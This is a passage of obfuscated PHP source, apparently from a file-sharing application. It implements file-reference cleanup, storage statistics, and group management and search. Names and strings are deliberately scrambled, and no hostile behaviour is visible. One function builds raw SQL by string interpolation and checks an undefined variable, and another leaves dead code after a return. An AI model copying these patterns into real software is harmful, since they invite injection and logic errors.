$this->where($ˆ•Û¸²)->select(); if (!$¸„­®ªÂ) { return; } $’£½óÕç = new Task($Ë¶³Ù¦æ[2050], $Ë¶³Ù¦æ[12], count($¸„­®ªÂ)); foreach ($¸„­®ªÂ as $××›Ôå´) { $’£½óÕç->update(1); $this->resetFile($××›Ôå´); } $’£½óÕç->end(); } public function resetFile($››È­ê‡) { $——•ÔÏ™ =& $_SERVER[ÔÕ±ĞšÎ]; $¸àÄßó– = array($——•ÔÏ™[544] => $››È­ê‡[$——•ÔÏ™[543]]); $Ú„§À = Model($——•ÔÏ™[1423])->where($¸àÄßó–)->count(); $ş·„°äÆ = Model($——•ÔÏ™[2051])->where($¸àÄßó–)->count(); $‹é½„‰ = intval($Ú„§À) + intval($ş·„°äÆ); if ($‹é½„‰ == 0) { IO::remove($››È­ê‡[$——•ÔÏ™[87]]); Model($——•ÔÏ™[2052])->delete($››È­ê‡[$——•ÔÏ™[543]]); $this->where($¸àÄßó–)->delete(); $this->metaSet($››È­ê‡[$——•ÔÏ™[543]], null, null); write_log(ACTION . $——•ÔÏ™[2053] . KodUser::id() . $——•ÔÏ™[2054] . $››È­ê‡[$——•ÔÏ™[543]] . $——•ÔÏ™[2055] . $››È­ê‡[$——•ÔÏ™[79]] . $——•ÔÏ™[201] . $››È­ê‡[$——•ÔÏ™[87]], $——•ÔÏ™[2056]); return; } if ($››È­ê‡[$——•ÔÏ™[2047]] != $‹é½„‰) { $this->where($¸àÄßó–)->save(array($——•ÔÏ™[2040] => $‹é½„‰)); } } public function storageInfo($À¶—êÅÅ = false) { $ä¸äÇ“ =& $_SERVER[ÔÕ±ĞšÎ]; $ĞÅéßõ• = $this->count() + 0.0; $şúÏ²Êâ = 0; $ğïä¨Ó¿ = 1; $ˆÑ¨âÍè = 0; $„‰»åÚÃ = 5000; for ($™™ğïÛÍ = 0; $™™ğïÛÍ < $ĞÅéßõ•; $™™ğïÛÍ = $™™ğïÛÍ + $„‰»åÚÃ) { $Ãñã¨Å‚ = $this->limit($™™ğïÛÍ, $™™ğïÛÍ + $„‰»åÚÃ)->select(); foreach ($Ãñã¨Å‚ as $×Ÿ¢°ŒÀ) { $ğïä¨Ó¿ += $×Ÿ¢°ŒÀ[$ä¸äÇ“[79]] * $×Ÿ¢°ŒÀ[$ä¸äÇ“[2047]]; $şúÏ²Êâ += $×Ÿ¢°ŒÀ[$ä¸äÇ“[79]] * ($×Ÿ¢°ŒÀ[$ä¸äÇ“[2047]] - 1); $ˆÑ¨âÍè += $×Ÿ¢°ŒÀ[$ä¸äÇ“[2047]]; } } $­¹òÒµ = array($ä¸äÇ“[2057] => $ğïä¨Ó¿, $ä¸äÇ“[2058] => $şúÏ²Êâ, $ä¸äÇ“[2059] => $şúÏ²Êâ / $ğïä¨Ó¿, $ä¸äÇ“[83] => $ĞÅéßõ•, $ä¸äÇ“[2060] => $ˆÑ¨âÍè); return $­¹òÒµ; } } class GroupModel extends ModelBase { protected $tableName = "\147\x72\x6f\x75\160"; protected $tableMeta = array("\x74\141\x62\154\x65\116\141\x6d\145" => "\x67\162\157\x75\160\x5f\155\x65\164\x61", "\155\145\164\141\x46\x69\145\154\144" => "\x67\162\x6f\x75\160\x49\104"); protected function cacheFunctionAlias($í•¹÷ïù) { $Â‰Ç¹¯ =& $_SERVER[ÔÕ±ĞšÎ]; return array($Â‰Ç¹¯[2061] => array($í•¹÷ïù[0], $Â‰Ç¹¯[2062]), $Â‰Ç¹¯[2063] => array($í•¹÷ïù[0], $Â‰Ç¹¯[2064])); } protected function getInfo($¤‹¨¥•¯, $ùÙºº  = false) { $ûÎî¤ü× = $this->getInfoSimple($¤‹¨¥•¯); if (!$ûÎî¤ü×) { return !1; } if ($ùÙºº ) { return $this->_listDataApplyItem($ûÎî¤ü×); } return $this->cacheFunctionGet($_SERVER[ÔÕ±ĞšÎ][2065], $¤‹¨¥•¯); } protected function getInfoSimple($™¥›õ¡ü, $å¶’ª¬ò = false) { $È¢Ã•åÂ =& $_SERVER[ÔÕ±ĞšÎ]; if ($å¶’ª¬ò) { $îî›÷‘¸ = array($È¢Ã•åÂ[1978] => intval($™¥›õ¡ü)); $ÀŞøáÌ = $this->where($îî›÷‘¸)->find(); return is_array($ÀŞøáÌ) ? $ÀŞøáÌ : array(); } return $this->cacheFunctionGet($È¢Ã•åÂ[2066], $™¥›õ¡ü); } protected function groupAdd($½İÓ¾¿š) { $™×şöµ =& $_SERVER[ÔÕ±ĞšÎ]; if (!$½İÓ¾¿š[$™×şöµ[192]] && isset($½İÓ¾¿š[$™×şöµ[1978]]) && $½İÓ¾¿š[$™×şöµ[1978]] == 1) { if ($Õ¦›Ğ‘Æ = $this->getInfoSimple($½İÓ¾¿š[$™×şöµ[1978]], !0)) { return $½İÓ¾¿š[$™×şöµ[1978]]; } } else { $Õ¦›Ğ‘Æ = $this->getInfoSimple($½İÓ¾¿š[$™×şöµ[192]]); if (!$Õ¦›Ğ‘Æ) { return !1; } } $®½Ô¬è¸ = $™×şöµ[595]; if ($Õ¦›Ğ‘Æ[$™×şöµ[586]]) { $®½Ô¬è¸ = $Õ¦›Ğ‘Æ[$™×şöµ[586]] . $Õ¦›Ğ‘Æ[$™×şöµ[1978]] . $™×şöµ[50]; } $´Øğ•® = array($™×şöµ[496] => $this->groupNameAuto($½İÓ¾¿š[$™×şöµ[192]], $½İÓ¾¿š[$™×şöµ[32]]), $™×şöµ[479] => $½İÓ¾¿š[$™×şöµ[192]], $™×şöµ[657] => $®½Ô¬è¸, $™×şöµ[2067] => $½İÓ¾¿š[$™×şöµ[1964]], $™×şöµ[2068] => 0, $™×şöµ[1982] => 0); if (isset($½İÓ¾¿š[$™×şöµ[2002]])) { $´Øğ•®[$™×şöµ[2002]] = $½İÓ¾¿š[$™×şöµ[2002]]; } else { $µ×ŸÑ• = $this->max($™×şöµ[2002]); if (!$µ×ŸÑ•) { $µ×ŸÑ• = 0; } $´Øğ•®[$™×şöµ[2002]] = $µ×ŸÑ• + 1; } if (!empty($½İÓ¾¿š[$™×şöµ[1978]])) { $´Øğ•®[$™×şöµ[1978]] = $½İÓ¾¿š[$™×şöµ[1978]]; } $°ˆ­×Àã = $this->add($´Øğ•®); $this->setNamePinyin($°ˆ­×Àã, $´Øğ•®[$™×şöµ[32]]); if (isset($½İÓ¾¿š[$™×şöµ[2069]])) { $this->metaSet($°ˆ­×Àã, array($™×şöµ[2069] => $½İÓ¾¿š[$™×şöµ[2069]], $™×şöµ[2070] => $½İÓ¾¿š[$™×şöµ[2070]])); unset($½İÓ¾¿š[$™×şöµ[2069]]); unset($½İÓ¾¿š[$™×şöµ[2070]]); } Model($™×şöµ[1423])->groupRootAdd($°ˆ­×Àã); $this->_clearCache($½İÓ¾¿š[$™×şöµ[192]]); return $°ˆ­×Àã; } protected function groupEdit($¹…è²àß, $¦“üÁËÜ) { $½¯•õ =& $_SERVER[ÔÕ±ĞšÎ]; $„ŠËù˜ = $this->getInfoSimple($¹…è²àß); if (!$„ŠËù˜) { return !1; } if (!empty($¦“üÁËÜ[$½¯•õ[192]])) { $òÊ—áÍ = $this->getInfoSimple($¦“üÁËÜ[$½¯•õ[192]]); if (!$òÊ—áÍ) { return !1; } if ($„ŠËù˜[$½¯•õ[1978]] == $òÊ—áÍ[$½¯•õ[1978]]) { return !1; } if ($¦“üÁËÜ[$½¯•õ[192]] != $„ŠËù˜[$½¯•õ[192]]) { if ($òÊ—áÍ[$½¯•õ[586]] !== $„ŠËù˜[$½¯•õ[586]] && strpos($òÊ—áÍ[$½¯•õ[586]], $„ŠËù˜[$½¯•õ[586]] . $„ŠËù˜[$½¯•õ[1978]] . $½¯•õ[50]) === 0) { return !1; } $¦“üÁËÜ[$½¯•õ[657]] = $òÊ—áÍ[$½¯•õ[586]] . $¦“üÁËÜ[$½¯•õ[192]] . $½¯•õ[50]; $this->_changeChildLevel($„ŠËù˜, $òÊ—áÍ); $this->_clearCache($òÊ—áÍ[$½¯•õ[1978]]); $this->_clearCache($„ŠËù˜[$½¯•õ[192]]); } } if (isset($¦“üÁËÜ[$½¯•õ[32]])) { $this->setNamePinyin($¹…è²àß, $¦“üÁËÜ[$½¯•õ[32]]); } if (isset($¦“üÁËÜ[$½¯•õ[2069]])) { $this->metaSet($¹…è²àß, array($½¯•õ[2069] => $¦“üÁËÜ[$½¯•õ[2069]], $½¯•õ[2070] => $¦“üÁËÜ[$½¯•õ[2070]])); unset($¦“üÁËÜ[$½¯•õ[2069]]); unset($¦“üÁËÜ[$½¯•õ[2070]]); } $this->_clearChildrenCache($„ŠËù˜); return $this->where(array($½¯•õ[2071] => $¹…è²àß))->save($¦“üÁËÜ); } private function _clearChildrenCache($Ø¨à“É) { $î€°ã²¨ =& $_SERVER[ÔÕ±ĞšÎ]; $•Òï¥é = array($î€°ã²¨[657] => array($î€°ã²¨[617], $Ø¨à“É[$î€°ã²¨[586]] . $Ø¨à“É[$î€°ã²¨[1978]] . $î€°ã²¨[618])); $ƒ””ÚùÑ = $this->field($î€°ã²¨[1978])->where($•Òï¥é)->select(); foreach ($ƒ””ÚùÑ as $¶ó½³„”) { $this->_clearCache($¶ó½³„”[$î€°ã²¨[1978]]); } } private function _clearCache($ùåÄ¾ˆë) { $·ø¶£ñ =& $_SERVER[ÔÕ±ĞšÎ]; $this->cacheFunctionClear($·ø¶£ñ[2065], $ùåÄ¾ˆë); $this->cacheFunctionClear($·ø¶£ñ[2066], $ùåÄ¾ˆë); } private function _changeChildLevel($š‰Ë•»š, $ÎÎŸ‚Ì˜, $¶ÉÂ†³ = false) { $©Ğ‹šˆ =& $_SERVER[ÔÕ±ĞšÎ]; $åĞ¼¸¢  = $š‰Ë•»š[$©Ğ‹šˆ[586]] . $š‰Ë•»š[$©Ğ‹šˆ[1978]] . $©Ğ‹šˆ[50]; $™œ¥£ƒÏ = $ÎÎŸ‚Ì˜[$©Ğ‹šˆ[586]] . $ÎÎŸ‚Ì˜[$©Ğ‹šˆ[1978]] . $©Ğ‹šˆ[50] . $š‰Ë•»š[$©Ğ‹šˆ[1978]] . $©Ğ‹šˆ[50]; if ($¶ÉÂ†³) { $™œ¥£ƒÏ = $ÎÎŸ‚Ì˜[$©Ğ‹šˆ[586]] . $ÎÎŸ‚Ì˜[$©Ğ‹šˆ[1978]] . $©Ğ‹šˆ[50]; } $¿’­Şô§ = array($©Ğ‹šˆ[657] => array($©Ğ‹šˆ[617], $š‰Ë•»š[$©Ğ‹šˆ[586]] . $š‰Ë•»š[$©Ğ‹šˆ[1978]] . $©Ğ‹šˆ[618])); $ò£ƒİ• = array($©Ğ‹šˆ[657] => array($©Ğ‹šˆ[666], "\162\145\x70\x6c\x61\143\145\50\x70\x61\162\145\156\164\114\x65\x76\145\x6c\x2c\47{$åĞ¼¸¢ }\47\x2c\x27{$™œ¥£ƒÏ}\x27\51")); $this->_clearChildrenCache($š‰Ë•»š); $this->where($¿’­Şô§)->data($ò£ƒİ•)->save(); } public function setNamePinyin($İóíİ¥È, $ï¬Å­ß = false) { $åô¾„—Ô =& $_SERVER[ÔÕ±ĞšÎ]; if (!$ï¬Å­ß) { $ï†ÄĞšß = $this->getInfoSimple($İóíİ¥È); $ï¬Å­ß = $ï†ÄĞšß[$åô¾„—Ô[32]]; } if (!Input::check($ï¬Å­ß, $åô¾„—Ô[660])) { $this->metaSet($İóíİ¥È, $åô¾„—Ô[540], null); $this->metaSet($İóíİ¥È, $åô¾„—Ô[539], null); return; } $„¾€¤ = array($åô¾„—Ô[540] => str_replace($åô¾„—Ô[53], $åô¾„—Ô[12], Pinyin::get($ï¬Å­ß)), $åô¾„—Ô[539] => Pinyin::get($ï¬Å­ß, $åô¾„—Ô[661])); $this->metaSet($İóíİ¥È, $„¾€¤); } protected function metaSet($ÜëÒüĞÈ, $ôÌÚÆÒ´ = null, $Â¹ù€ª = null) { $this->_clearCache($ÜëÒüĞÈ); return parent::metaSet($ÜëÒüĞÈ, $ôÌÚÆÒ´, $Â¹ù€ª); } protected function groupStatus($°š†Òš¶, $Ü¢ïıÚî) { $éÀáã¥“ =& $_SERVER[ÔÕ±ĞšÎ]; $³Ÿ©Òå¸ = $this->getInfoSimple($°š†Òš¶); if (!$³Ÿ©Òå¸) { return !1; } $this->_clearCache($°š†Òš¶); return $this->metaSet($°š†Òš¶, $éÀáã¥“[824], $Ü¢ïıÚî); if ($Ü¢ïıÚî == $éÀáã¥“[91]) { $´±ÜÔù¨ = $this->parentLevelArray($³Ÿ©Òå¸[$éÀáã¥“[586]]); } else { } $´±ÜÔù¨[] = $³Ÿ©Òå¸[$éÀáã¥“[1978]]; $–ŒÒ„ˆœ = array(); foreach ($´±ÜÔù¨ as $°š†Òš¶) { $–ŒÒ„ˆœ[] = array($éÀáã¥“[1978] => $°š†Òš¶, $éÀáã¥“[97] => $éÀáã¥“[824], $éÀáã¥“[452] => $Ü¢ïıÚî); $this->_clearCache($°š†Òš¶); } return Model($éÀáã¥“[2072])->addAll($–ŒÒ„ˆœ, array(), !0); } protected function groupRemove($óáå¶©·, $Ñ›ÈõÈ· = false) { $êÑëï =& $_SERVER[ÔÕ±ĞšÎ]; $ñÜëàª = array($êÑëï[1978] => $óáå¶©·); $À£ò³¶ = $this->where($ñÜëàª)->find(); if (!$À£ò³¶ || $À£ò³¶[$êÑëï[192]] == 0) { return !1; } if (!$Ñ›ÈõÈ·) { $Õú­ĞÓ³ = $this->getInfoSimple($À£ò³¶[$êÑëï[192]]); $this->_changeChildLevel($À£ò³¶, $Õú­ĞÓ³, !0); $this->where(array($êÑëï[192] => $óáå¶©·))->save(array($êÑëï[192] => $À£ò³¶[$êÑëï[192]])); $this->_clearCache($Õú­ĞÓ³[$êÑëï[1978]]); } Model($êÑëï[2072])->where($ñÜëàª)->delete(); Model($êÑëï[2073])->where($ñÜëàª)->delete(); Model($êÑëï[899])->groupRootRemove($óáå¶©·); $this->_clearCache($À£ò³¶[$êÑëï[192]]); return $this->where($ñÜëàª)->delete(); } protected function groupSort($µÓ‰ŸÏ€) { $óÅüññ« =& $_SERVER[ÔÕ±ĞšÎ]; $ü£ÂéØ— = array(); foreach ($µÓ‰ŸÏ€ as $ãğ‰òõÏ => $ˆõù¬§) { $ü£ÂéØ—[] = array($óÅüññ«[1978], $ˆõù¬§, $óÅüññ«[2002], $ãğ‰òõÏ + 1); } $this->saveAll($ü£ÂéØ—); } public function listData() { $öÃ‚¸¯å = $this->_makeOrder()->selectPage(50); $this->_listDataApply($öÃ‚¸¯å[$_SERVER[ÔÕ±ĞšÎ][447]]); return $öÃ‚¸¯å; } private function _makeOrder($ùøÉÁªÒ = '') { $ˆ©Õ«ùÅ =& $_SERVER[ÔÕ±ĞšÎ]; $ÂœÀ®­ = array($ˆ©Õ«ùÅ[1978], $ˆ©Õ«ùÅ[32], $ˆ©Õ«ùÅ[1966], $ˆ©Õ«ùÅ[233]); $‡÷ÏÏæ½ = array($ˆ©Õ«ùÅ[525] => $ˆ©Õ«ùÅ[526], $ˆ©Õ«ùÅ[527] => $ˆ©Õ«ùÅ[528]); $ßÓú‘Ë® = Input::get($ˆ©Õ«ùÅ[532], $ˆ©Õ«ùÅ[7], $ˆ©Õ«ùÅ[1982], $ÂœÀ®­); $±ç€–´¢ = Input::get($ˆ©Õ«ùÅ[533], $ˆ©Õ«ùÅ[7], $ˆ©Õ«ùÅ[2074], array($ˆ©Õ«ùÅ[2074], $ˆ©Õ«ùÅ[527])); $±ç€–´¢ = $‡÷ÏÏæ½[$±ç€–´¢]; $ùøÉÁªÒ = $ùøÉÁªÒ . "{$ßÓú‘Ë®}\x20{$±ç€–´¢}\54\40\x67\x72\x6f\165\160\111\104\40\141\x73\143"; return $this->order($ùøÉÁªÒ); } public function listChild($å€ºÎ“«) { $è¶”¿ =& $_SERVER[ÔÕ±ĞšÎ]; $…ï­›ÈÑ = $this->where(array($è¶”¿[192] => $å€ºÎ“«))->_makeOrder()->selectPage(200); $this->_listDataApply($…ï­›ÈÑ[$è¶”¿[447]]); return $…ï­›ÈÑ; } public function listChildIds($†ºªÙ») { $„¥ëÛ¢ =& $_SERVER[ÔÕ±ĞšÎ]; if (is_string($ÊÓæµÔº)) { $†ºªÙ» = explode($„¥ëÛ¢[50], $†ºªÙ»); } $Ãà›ÍŞ = $this->where(array($„¥ëÛ¢[1978] => array($„¥ëÛ¢[7], $†ºªÙ»)))->field($„¥ëÛ¢[2075])->select(); if (!$Ãà›ÍŞ) { return !1; } $şÌÉå¿â = array(); foreach ($Ãà›ÍŞ as $¡­ÅŒ‰) { $şÌÉå¿â[] = "\163\x65\x6c\x65\x63\164\40\x67\x72\157\165\x70\111\104\x20\146\x72\x6f\x6d\40\x60\147\162\157\x75\x70\140\40\x77\x68\145\162\x65\x20\x70\x61\162\145\x6e\164\114\145\x76\x65\x6c\x20\x6c\151\153\145\x20\x27{$¡­ÅŒ‰[$„¥ëÛ¢[586]]}{$¡­ÅŒ‰[$„¥ëÛ¢[1978]]}\54\x25\47"; } $şÌÉå¿â = implode($„¥ëÛ¢[2076], $şÌÉå¿â); $Ãà›ÍŞ = $this->query($şÌÉå¿â); if (!$Ãà›ÍŞ) { return array(); } $†ºªÙ» = array_to_keyvalue($Ãà›ÍŞ, $„¥ëÛ¢[12], $„¥ëÛ¢[1978]); return array_unique($†ºªÙ»); } public function listByID($ËÄÆó½) { $¾æ¼çŒ =& $_SERVER[ÔÕ±ĞšÎ]; if (!$ËÄÆó½) { return array(); } $€Ø£á« = array($¾æ¼çŒ[1978] => array($¾æ¼çŒ[7], $ËÄÆó½)); $’¼Ùï©» = $this->where($€Ø£á«)->select(); $’¼Ùï©» = array_sort_keep($’¼Ùï©», $¾æ¼çŒ[1978], $ËÄÆó½); $this->_listDataApply($’¼Ùï©»); return $’¼Ùï©»; } public function listSearch($îô¼ı½î) { $ó‹æ–šç =& $_SERVER[ÔÕ±ĞšÎ]; $ŠºİéÀ = trim($îô¼ı½î[$ó‹æ–šç[2077]]); $ŸÉòçŸ = explode($ó‹æ–šç[53], $ŠºİéÀ); if (!$ŠºİéÀ || count($ŸÉòçŸ) == 1) { return $this->listSearchNow($îô¼ı½î); } $‰ªœÌ©™ = array($ó‹æ–šç[447] => array()); foreach ($ŸÉòçŸ as $ÍÄíËœÈ) { if (!trim($ÍÄíËœÈ)) { continue; } $îô¼ı½î[$ó‹æ–šç[2077]] = $ÍÄíËœÈ; $ŠÅì†¨ø = $this->listSearchNow($îô¼ı½î); $‰ªœÌ©™[$ó‹æ–šç[447]] = array_merge($‰ªœÌ©™[$ó‹æ–šç[447]], $ŠÅì†¨ø[$ó‹æ–šç[447]]); } $‰ªœÌ©™[$ó‹æ–šç[447]] = array_unique_by_key($‰ªœÌ©™[$ó‹æ–šç[447]], $ó‹æ–šç[1978]); $‰ªœÌ©™[$ó‹æ–šç[444]] = array($ó‹æ–šç[445] => count($‰ªœÌ©™[$ó‹æ–šç[447]]), $ó‹æ–šç[441] => 20, $ó‹æ–šç[430] => 1, $ó‹æ–šç[446] => 1); return $‰ªœÌ©™; } public function listSearchNow($”©¶òç) { $ÌØŞÃ½æ =& $_SERVER[ÔÕ±ĞšÎ]; $Ìû‚Ù²Ö = trim($”©¶òç[$ÌØŞÃ½æ[2077]]); $”ÛÆæŒƒ = isset($”©¶òç[$ÌØŞÃ½æ[2078]]) ? $”©¶òç[$ÌØŞÃ½æ[2078]] : !1; if (!trim($Ìû‚Ù²Ö)) { return !1; } $Ìû‚Ù²Ö = str_replace($ÌØŞÃ½æ[2079], $ÌØŞÃ½æ[2080], $Ìû‚Ù²Ö); $–†Ÿ»½ = array($ÌØŞÃ½æ[1978] => array($ÌØŞÃ½æ[461], "{$Ìû‚Ù²Ö}\x25"), $ÌØŞÃ½æ[32] => array($ÌØŞÃ½æ[461], "\45{$Ìû‚Ù²Ö}\x25"), $ÌØŞÃ½æ[1079] => $ÌØŞÃ½æ[2081]); if ($”ÛÆæŒƒ) { $Èˆş‹ÉÇ = $this->getInfoSimple($”ÛÆæŒƒ); $£ó¾†‘ï = $Èˆş‹ÉÇ[$ÌØŞÃ½æ[586]] . $”ÛÆæŒƒ . $ÌØŞÃ½æ[618]; $–†Ÿ»½ = array($–†Ÿ»½, array($ÌØŞÃ½æ[586] => array($ÌØŞÃ½æ[461], $£ó¾†‘ï))); } $–†Ÿ»½ = $this->parseWhereLike($–†Ÿ»½); $ıÈç¼Œ = $this->_makeOrder()->where($–†Ÿ»½)->selectPage(20); $ıÈç¼Œ = $ıÈç¼Œ ? $ıÈç¼Œ : array($ÌØŞÃ½æ[447] => array(), $ÌØŞÃ½æ[444] => array()); if (!$ıÈç¼Œ || count($ıÈç¼Œ[$ÌØŞÃ½æ[447]]) < 5 && Input::check($Ìû‚Ù²Ö, $ÌØŞÃ½æ[395])) { $¹Ú˜ß½» = $this->groupChildrenAll($”ÛÆæŒƒ); $“™”‡à  = $this->_searchFromMeta($ÌØŞÃ½æ[539], $Ìû‚Ù²Ö, 10, $¹Ú˜ß½»); $›¸®«•‚ = $this->_searchFromMeta($ÌØŞÃ½æ[540], $Ìû‚Ù²Ö, 10, $¹Ú˜ß½»); $´ÂÃÃ€É = array_merge($“™”‡à , $›¸®«•‚, $ıÈç¼Œ[$ÌØŞÃ½æ[447]]); $ıÈç¼Œ[$ÌØŞÃ½æ[447]] = array_unique_by_key($´ÂÃÃ€É, $ÌØŞÃ½æ[1978]); $ıÈç¼Œ[$ÌØŞÃ½æ[444]][$ÌØŞÃ½æ[445]] = count($ıÈç¼Œ[$ÌØŞÃ½æ[447]]); $ıÈç¼Œ[$ÌØŞÃ½æ[444]][$ÌØŞÃ½æ[446]] = ceil($ıÈç¼Œ[$ÌØŞÃ½æ[444]][$ÌØŞÃ½æ[445]] / $ıÈç¼Œ[$ÌØŞÃ½æ[444]][$ÌØŞÃ½æ[441]]); } $this->_listDataApply($ıÈç¼Œ[$ÌØŞÃ½æ[447]]); return $ıÈç¼Œ; } protected function groupChildrenAll($ÊÆÌ×ª²) { $¡®ø¯û¿ =& $_SERVER[ÔÕ±ĞšÎ]; if (!$ÊÆÌ×ª²) { return !1; } if (!is_array($ÊÆÌ×ª²)) { $ÊÆÌ×ª² = array($ÊÆÌ×ª²); } $œò÷€¤ = $ÊÆÌ×ª²; foreach ($ÊÆÌ×ª² as $ÊÃÚÅæ°) { $Ûéæ™îô = $this->getInfoSimple($ÊÃÚÅæ°); $·©ö‘Çç = array($¡®ø¯û¿[586] => array($¡®ø¯û¿[461], $Ûéæ™îô[$¡®ø¯û¿[586]] . $ÊÃÚÅæ° . $¡®ø¯û¿[618])); $„Õ®ÔíÕ = $this->field($¡®ø¯û¿[1978])->where($·©ö‘Çç)->select(); $œò÷€¤ = array_merge($œò÷€¤, array_to_keyvalue($„Õ®ÔíÕ, $¡®ø¯û¿[12], $¡®ø¯û¿[1978])); } return array_unique($œò÷€¤); } private function _searchFromMeta($—Û×µœÓ, $¯ØÎĞ, $€®äª«, $«Íò†ğø) { $¶ú® ª¹ =& $_SERVER[ÔÕ±ĞšÎ]; $¯ØÎĞ = strtolower($¯ØÎĞ); $¼‹Â™´¬ = array($¶ú® ª¹[97] => $—Û×µœÓ, $¶ú® ª¹[452] => array($¶ú® ª¹[461], "\45{$¯ØÎĞ}\45")); $¼‹Â™´¬ = $this->parseWhereLike($¼‹Â™´¬); if ($«Íò†ğø) { $¼‹Â™´¬[$¶ú® ª¹[1978]] = array($¶ú® ª¹[7], $«Íò†ğø); } $ç–áóï‘ = Model($¶ú® ª¹[2082])->where($¼‹Â™´¬)->limit($€®äª«)->select(); if (!$ç–áóï‘) { return array(); } $ç–áóï‘ = array_to_keyvalue($ç–áóï‘, $¶ú® ª¹[12], $¶ú® ª¹[1978]); $úûĞéçø = $this->where(array($¶ú® ª¹[2071] => array($¶ú® ª¹[7], $ç–áóï‘)))->select(); if (!$úûĞéçø) { return array(); } return $úûĞéçø; } protected function _listDataApplyItem($ì©¬Ëê¥) { $÷èÖ÷¨ = array($ì©¬Ëê¥); $this->_listDataApply($÷èÖ÷¨); return $÷èÖ÷¨[0]; } protected function _listDataApply(&$¸À†¤¤¼) { $œîÊ¢šÖ =& $_SERVER[ÔÕ±ĞšÎ]; if (!$¸À†¤¤¼) { return; } $¦€„³ë± = array_to_keyvalue($¸À†¤¤¼, $œîÊ¢šÖ[12], $œîÊ¢šÖ[1978]); $this->_listAppendChildren($¸À†¤¤¼); $this->_listAppendChildrenMember($¸À†¤¤¼); $this->_listAppendMeta($¸À†¤¤¼, $¦€„³ë±); $this->_listAppendParent($¸À†¤¤¼); $this->_listAppendSourceRoot($¸À†¤¤¼, $¦€„³ë±); } private function _listAppendChildren(&$ëò¸¶Ş) { $Å¬ò—ğ™ =& $_SERVER[ÔÕ±ĞšÎ]; $î„é—»Ë = array_to_keyvalue($ëò¸¶Ş, $Å¬ò—ğ™[12], $Å¬ò—ğ™[1978]); $ˆ®Ó„— = array($Å¬ò—ğ™[192] => array($Å¬ò—ğ™[7], $î„é—»Ë)); $½Æü‰‘ = array($Å¬ò—ğ™[192], $Å¬ò—ğ™[2083] => $Å¬ò—ğ™[567]); $­‘¼ÍõÄ = $this->field($½Æü‰‘)->where($ˆ®Ó„—)->group($Å¬ò—ğ™[192])->select(); $˜Ö™›Ô = array_to_keyvalue($­‘¼ÍõÄ, $Å¬ò—ğ™[192], $Å¬ò—ğ™[567]); foreach ($ëò¸¶Ş as &$İÉü¿) { $«µÚ‚¢˜ = $İÉü¿[$Å¬ò—ğ™[1978]]; $İÉü¿[$Å¬ò—ğ™[2084]] = isset($˜Ö™›Ô[$«µÚ‚¢˜]) ? intval($˜Ö™›Ô[$«µÚ‚¢˜]) : !1; } unset($İÉü¿); } private function _listAppendChildrenMember(&$Ü‚“â˜İ) { $Şá§û•‚ =& $_SERVER[ÔÕ±ĞšÎ]; $½º¦ëÖú = array_to_keyvalue($Ü‚“â˜İ, $Şá§û•‚[12], $Şá§û•‚[1978]); $ÙåŠü©è = array($Şá§û•‚[1978] => array($Şá§û•‚[7], $½º¦ëÖú)); $¤®ÒÆÔæ = array($Şá§û•‚[1978], $Şá§û•‚[2083] => $Şá§û•‚[567]); $¤àÚ“šé = Model($Şá§û•‚[2073])->field($¤®ÒÆÔæ)->where($ÙåŠü©è)->group($Şá§û•‚[1978])->select(); $©²Ÿ•Ç¹ = array_to_keyvalue($¤àÚ“šé, $Şá§û•‚[1978], $Şá§û•‚[567]); foreach ($Ü‚“â˜İ as &$¨Ú‡¦İ¤) { $»ßˆøœ£ = $¨Ú‡¦İ¤[$Şá§û•‚[1978]]; $¨Ú‡¦İ¤[$Şá§û•‚[2085]] = isset($©²Ÿ•Ç¹[$»ßˆøœ£]) ? intval($©²Ÿ•Ç¹[$»ßˆøœ£]) : !1; } unset($¨Ú‡¦İ¤); } private function _listAppendMeta(&$ÎÔéÓÉ£, $¸ç³â§º) { $»÷â¶óÜ =& $_SERVER[ÔÕ±ĞšÎ]; $Áö—×ïæ = array($»÷â¶óÜ[1978] => array($»÷â¶óÜ[7], $¸ç³â§º)); $ŠÄÂŒ¦ = Model($»÷â¶óÜ[2072])->where($Áö—×ïæ)->select(); $ŠÄÂŒ¦ = array_to_keyvalue_group($ŠÄÂŒ¦, $»÷â¶óÜ[1978]); foreach ($ŠÄÂŒ¦ as &$—§¬è×¨) { $—§¬è×¨ = array_to_keyvalue($—§¬è×¨, $»÷â¶óÜ[97], $»÷â¶óÜ[452]); } unset($—§¬è×¨); foreach ($ÎÔéÓÉ£ as &$ôÂ»·ÛÛ) { $ôÂ»·ÛÛ[$»÷â¶óÜ[541]] = array(); if (isset($ŠÄÂŒ¦[$ôÂ»·ÛÛ[$»÷â¶óÜ[1978]]])) { $ôÂ»·ÛÛ[$»÷â¶óÜ[541]] = $ŠÄÂŒ¦[$ôÂ»·ÛÛ[$»÷â¶óÜ[1978]]]; } } unset($ôÂ»·ÛÛ); } protected function parentLevelArray($ªêğ‡¯ƒ) { $ÕÈöË¾£ =& $_SERVER[ÔÕ±ĞšÎ]; $ªêğ‡¯ƒ = explode($ÕÈöË¾£[50], trim($ªêğ‡¯ƒ, $ÕÈöË¾£[50])); $ªêğ‡¯ƒ = array_remove_value($ªêğ‡¯ƒ, $ÕÈöË¾£[230]); return $ªêğ‡¯ƒ; } protected function parentInGroup($ÕíÔè¨Ê, $ßŠ‚Ç¯İ) { $Òş™§•¥ =& $_SERVER[ÔÕ±ĞšÎ]; $ş–î»…© = $this->getInfoSimple($ÕíÔè¨Ê); if (!$ş–î»…©) { return !0; } $é‰ê…úƒ = $this->parentLevelArray($ş–î»…©[$Òş™§•¥[586]]); $é‰ê…úƒ[] = $ÕíÔè¨Ê; foreach ($é‰ê…úƒ as $ÕíÔè¨Ê) { if (in_array($ÕíÔè¨Ê . $Òş™§•¥[12], $ßŠ‚Ç¯İ)) { return !0; } } return !1; } private function _listAppendParent(&$©çƒ¦–ó) { $ÏÑËÀÄ =& $_SERVER[ÔÕ±ĞšÎ]; $‘ï°€“‡ = array(); foreach ($©çƒ¦–ó as &$ŸŸ›´±ü) { $‘ï°€“‡[$ŸŸ›´±ü[$ÏÑËÀÄ[1978]]] = $ŸŸ›´±ü[$ÏÑËÀÄ[32]]; $Õ¢‡ü¼ = $this->parentLevelArray($ŸŸ›´±ü[$ÏÑËÀÄ[586]]); foreach ($Õ¢‡ü¼ as $¡ñãò“û) { if (!isset($‘ï°€“‡[$¡ñãò“û])) { $‘ï°€“‡[$¡ñãò“û] = 0; } } } unset($ŸŸ›´±ü); foreach ($‘ï°€“‡ as $óÙ æÍ => $òàø´ğ) { if ($òàø´ğ) { continue; } $£ã›¬Ğ¼ = $this->getInfoSimple($óÙ æÍ); 